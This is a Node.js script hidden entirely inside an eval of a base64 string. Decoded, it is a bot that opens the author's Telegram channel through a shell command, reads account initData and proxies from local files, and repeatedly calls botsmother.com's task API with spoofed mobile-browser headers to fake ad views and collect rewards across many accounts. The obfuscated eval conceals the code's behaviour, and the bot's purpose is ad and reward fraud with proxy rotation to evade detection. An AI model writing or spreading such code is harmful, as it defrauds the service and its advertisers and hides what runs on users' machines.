const Buffer = require('buffer').Buffer;
eval(Buffer.from("Y29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CmNvbnN0IHsgZXhlYyB9ID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOwpjb25zdCB7IHNldFRpbWVvdXQ6IHNsZWVwIH0gPSByZXF1aXJlKCd0aW1lcnMvcHJvbWlzZXMnKTsKCi8vIEFOU0kgY29sb3IgY29kZXMKY29uc3QgY29sb3JzID0gewogICAgcmVkOiAnXHgxYlszMW0nLAogICAgZ3JlZW46ICdceDFiWzMybScsCiAgICB5ZWxsb3c6ICdceDFiWzMzbScsCiAgICBibHVlOiAnXHgxYlszNm0nLAogICAgcmVzZXQ6ICdceDFiWzBtJwp9OwoKZnVuY3Rpb24gb3BlblRlbGVncmFtTGluaygpIHsKICAgIGNvbnN0IHVybCA9ICdodHRwczovL3QubWUvRDRya0NpcGhlclgnOwogICAgY29uc29sZS5sb2coYCR7Y29sb3JzLmJsdWV9T3BlbmluZyBUZWxlZ3JhbSBjaGFubmVsOiAke3VybH0ke2NvbG9ycy5yZXNldH1gKTsKCiAgICBjb25zdCBjb21tYW5kID0gcHJvY2Vzcy5wbGF0Zm9ybSA9PT0gJ3dpbjMyJwogICAgICAgID8gYHN0YXJ0ICR7dXJsfWAKICAgICAgICA6IHByb2Nlc3MucGxhdGZvcm0gPT09ICdkYXJ3aW4nCiAgICAgICAgICAgID8gYG9wZW4gJHt1cmx9YAogICAgICAgICAgICA6IGB4ZGctb3BlbiAke3VybH1gOwoKICAgIGV4ZWMoY29tbWFuZCk7Cn0KCmNvbnNvbGUubG9nKGAke2NvbG9ycy5ibHVlfVNjcmlwdCBNYWRlIEJ5IEQ0cmtDaXBoZXJYJHtjb2xvcnMucmVzZXR9XG5gKTsKb3BlblRlbGVncmFtTGluaygpOwoKZnVuY3Rpb24gY29tbW9uSGVhZGVycygpIHsKICAgIHJldHVybiB7CiAgICAgICAgImF1dGhvcml0eSI6ICJib3RzbW90aGVyLmNvbSIsCiAgICAgICAgImFjY2VwdCI6ICIqLyoiLAogICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiZW4tSU4sZW4tR0I7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLAogICAgICAgICJjYWNoZS1jb250cm9sIjogIm5vLWNhY2hlIiwKICAgICAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJwcmFnbWEiOiAibm8tY2FjaGUiLAogICAgICAgICJyZWZlcmVyIjogImh0dHBzOi8vYm90c21vdGhlci5jb20vIiwKICAgICAgICAic2VjLWNoLXVhIjogIlwiTm90LUEuQnJhbmRcIjt2PVwiOTlcIiwgXCJDaHJvbWl1bVwiO3Y9XCIxMjRcIiIsCiAgICAgICAgInNlYy1jaC11YS1tb2JpbGUiOiAiPzEiLAogICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAiXCJBbmRyb2lkXCIiLAogICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJlbXB0eSIsCiAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogImNvcnMiLAogICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLW9yaWdpbiIsCiAgICAgICAgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IgogICAgfTsKfQoKYXN5bmMgZnVuY3Rpb24gZ2V0VGFza0lkKGluaXREYXRhLCBwcm94eSA9IG51bGwpIHsKICAgIGNvbnN0IHVybCA9IGBodHRwczovL2JvdHNtb3RoZXIuY29tL2FwaS9jb21tYW5kL09UTXgvTnpZMU1BPT0/JHtpbml0RGF0YX1gOwoKICAgIHRyeSB7CiAgICAgICAgY29uc3QgY29uZmlnID0gewogICAgICAgICAgICBoZWFkZXJzOiBjb21tb25IZWFkZXJzKCksCiAgICAgICAgICAgIHRpbWVvdXQ6IDE1MDAwCiAgICAgICAgfTsKCiAgICAgICAgaWYgKHByb3h5KSB7CiAgICAgICAgICAgIGNvbmZpZy5wcm94eSA9IHsKICAgICAgICAgICAgICAgIHByb3RvY29sOiAnaHR0cCcsCiAgICAgICAgICAgICAgICBob3N0OiBwcm94eS5zcGxpdCgnOicpWzBdLAogICAgICAgICAgICAgICAgcG9ydDogcHJveHkuc3BsaXQoJzonKVsxXQogICAgICAgICAgICB9OwogICAgICAgIH0KCiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQodXJsLCBjb25maWcpOwogICAgICAgIGNvbnN0IHRhc2tJZCA9IHJlc3BvbnNlLmRhdGE/LnRhc2tfaWQ7CiAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3JzLmdyZWVufVN1Y2Nlc3M6IEZvdW5kIHRhc2sgSUQ6ICR7dGFza0lkfSR7Y29sb3JzLnJlc2V0fWApOwogICAgICAgIHJldHVybiB0YXNrSWQ7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUubG9nKGAke2NvbG9ycy5yZWR9RXJyb3I6IEZhaWxlZCB0byBnZXQgdGFzayBJRDogJHtlcnJvci5tZXNzYWdlfSR7Y29sb3JzLnJlc2V0fWApOwogICAgICAgIHJldHVybiBudWxsOwogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBydW5UYXNrKHRhc2tJZCwgaW5pdERhdGEsIHByb3h5ID0gbnVsbCkgewogICAgaWYgKCF0YXNrSWQpIHsKICAgICAgICBjb25zb2xlLmxvZyhgJHtjb2xvcnMucmVkfUVycm9yOiBObyB0YXNrIElEIHByb3ZpZGVkJHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICB9CgogICAgY29uc3QgdGFza1VybCA9IGBodHRwczovL2JvdHNtb3RoZXIuY29tL2FwaS9jb21tYW5kL09UTXgvTnpZMU1RPT0/JHtpbml0RGF0YX0mdGFza19pZD0ke3Rhc2tJZH1gOwoKICAgIHRyeSB7CiAgICAgICAgY29uc3QgY29uZmlnID0gewogICAgICAgICAgICBoZWFkZXJzOiBjb21tb25IZWFkZXJzKCksCiAgICAgICAgICAgIHRpbWVvdXQ6IDE1MDAwCiAgICAgICAgfTsKCiAgICAgICAgaWYgKHByb3h5KSB7CiAgICAgICAgICAgIGNvbmZpZy5wcm94eSA9IHsKICAgICAgICAgICAgICAgIHByb3RvY29sOiAnaHR0cCcsCiAgICAgICAgICAgICAgICBob3N0OiBwcm94eS5zcGxpdCgnOicpWzBdLAogICAgICAgICAgICAgICAgcG9ydDogcHJveHkuc3BsaXQoJzonKVsxXQogICAgICAgICAgICB9OwogICAgICAgIH0KCiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQodGFza1VybCwgY29uZmlnKTsKICAgICAgICBjb25zb2xlLmxvZyhgJHtjb2xvcnMuZ3JlZW59U3VjY2VzczogQUQgU3RhcnRlZCBTdWNjZXNzZnVsbHkke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICByZXR1cm4gcmVzcG9uc2UuZGF0YTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3JzLnJlZH1FcnJvcjogRmFpbGVkIHRvIHJ1biBBRDogJHtlcnJvci5tZXNzYWdlfSR7Y29sb3JzLnJlc2V0fWApOwogICAgICAgIHJldHVybiBudWxsOwogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBydW5Gb3JBY2NvdW50KGluaXREYXRhLCBhY2NJbmRleCwgcHJveHlTdHIgPSBudWxsKSB7CiAgICBjb25zdCB0b3RhbFJ1bnMgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAyKSArIDE0OwogICAgY29uc29sZS5sb2coYFxuJHtjb2xvcnMuYmx1ZX1Qcm9jZXNzaW5nIEFjY291bnQgIyR7YWNjSW5kZXh9IC0gUnVubmluZyAke3RvdGFsUnVuc30gQWRzLi4uJHtjb2xvcnMucmVzZXR9XG5gKTsKCiAgICBmb3IgKGxldCBpID0gMTsgaSA8PSB0b3RhbFJ1bnM7IGkrKykgewogICAgICAgIGNvbnNvbGUubG9nKGAke2NvbG9ycy5ibHVlfUFEICR7aX0vJHt0b3RhbFJ1bnN9JHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgY29uc3QgdGFza0lkID0gYXdhaXQgZ2V0VGFza0lkKGluaXREYXRhLCBwcm94eVN0cik7CgogICAgICAgIGNvbnN0IGRlbGF5ID0gTWF0aC5yYW5kb20oKSAqIDEwMDAgKyA4MDAwOwogICAgICAgIGNvbnNvbGUubG9nKGAke2NvbG9ycy55ZWxsb3d9V2FpdGluZyAkeyhkZWxheS8xMDAwKS50b0ZpeGVkKDIpfSBzZWNvbmRzIGJlZm9yZSBuZXh0IEFELi4uJHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgYXdhaXQgc2xlZXAoZGVsYXkpOwoKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBydW5UYXNrKHRhc2tJZCwgaW5pdERhdGEsIHByb3h5U3RyKTsKCiAgICAgICAgaWYgKHJlc3VsdCkgewogICAgICAgICAgICBjb25zdCBzdGF0dXMgPSByZXN1bHQ/LnN0YXR1cyA/ICdTdWNjZXNzJyA6ICdGYWlsZWQnOwogICAgICAgICAgICBjb25zdCBjb2xvciA9IHJlc3VsdD8uc3RhdHVzID8gY29sb3JzLmdyZWVuIDogY29sb3JzLnJlZDsKICAgICAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3J9U3RhdHVzOiAke3N0YXR1c30gfCBCYWxhbmNlOiAke3Jlc3VsdC5iYWxhbmNlIHx8ICdOL0EnfSB8IEhvdXJseSBUYXNrczogJHtyZXN1bHQuaG91cmx5VGFza3MgfHwgJ04vQSd9JHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3JzLnJlZH1FcnJvcjogTm8gcmVzcG9uc2Ugb3IgZXJyb3IgZHVyaW5nIEFkIHBsYXlpbmcke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICB9CgogICAgICAgIGNvbnNvbGUubG9nKCctJy5yZXBlYXQoNDApKTsKICAgIH0KfQoKYXN5bmMgZnVuY3Rpb24gbWFpbigpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgYWNjb3VudHMgPSBmcy5yZWFkRmlsZVN5bmMoJ3F1ZXJ5LnR4dCcsICd1dGY4JykKICAgICAgICAgICAgICAgICAgICAgICAgIC5zcGxpdCgnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICAgLmZpbHRlcihsaW5lID0+IGxpbmUudHJpbSgpKTsKCiAgICAgICAgaWYgKGFjY291bnRzLmxlbmd0aCA9PT0gMCkgewogICAgICAgICAgICBjb25zb2xlLmxvZyhgJHtjb2xvcnMucmVkfUVycm9yOiAncXVlcnkudHh0JyBmaWxlIGlzIGVtcHR5LiBQbGVhc2UgYWRkIGluaXREYXRhIHN0cmluZ3Mke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgbGV0IHByb3hpZXMgPSBbXTsKICAgICAgICB0cnkgewogICAgICAgICAgICBwcm94aWVzID0gZnMucmVhZEZpbGVTeW5jKCdwcm94aWVzLnR4dCcsICd1dGY4JykKICAgICAgICAgICAgICAgICAgICAgICAuc3BsaXQoJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAuZmlsdGVyKGxpbmUgPT4gbGluZS50cmltKCkpOwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGlmIChlcnJvci5jb2RlID09PSAnRU5PRU5UJykgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3JzLnllbGxvd31XYXJuaW5nOiAncHJveGllcy50eHQnIG5vdCBmb3VuZC4gUnVubmluZyB3aXRob3V0IHByb3hpZXMke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGAke2NvbG9ycy5yZWR9UHJveHkgZXJyb3I6ICR7ZXJyb3IubWVzc2FnZX0ke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhY2NvdW50cy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICBjb25zdCBwcm94eVN0ciA9IHByb3hpZXMubGVuZ3RoID4gMCA/IHByb3hpZXNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogcHJveGllcy5sZW5ndGgpXSA6IG51bGw7CiAgICAgICAgICAgIGlmIChwcm94eVN0cikgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFxuJHtjb2xvcnMuYmx1ZX1Vc2luZyBwcm94eSBmb3IgQWNjb3VudCAjJHtpICsgMX06ICR7cHJveHlTdHJ9JHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgYXdhaXQgcnVuRm9yQWNjb3VudChhY2NvdW50c1tpXS50cmltKCksIGkgKyAxLCBwcm94eVN0cik7CiAgICAgICAgfQogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBpZiAoZXJyb3IuY29kZSA9PT0gJ0VOT0VOVCcpIHsKICAgICAgICAgICAgY29uc29sZS5sb2coYCR7Y29sb3JzLnJlZH1FcnJvcjogJ3F1ZXJ5LnR4dCcgZmlsZSBub3QgZm91bmQuIFBsZWFzZSBjcmVhdGUgaXQgd2l0aCBvbmUgaW5pdERhdGEgcGVyIGxpbmUke2NvbG9ycy5yZXNldH1gKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zb2xlLmxvZyhgJHtjb2xvcnMucmVkfUVycm9yOiAke2Vycm9yLm1lc3NhZ2V9JHtjb2xvcnMucmVzZXR9YCk7CiAgICAgICAgfQogICAgfQp9CgptYWluKCk7Cg==", 'base64').toString('utf-8'));
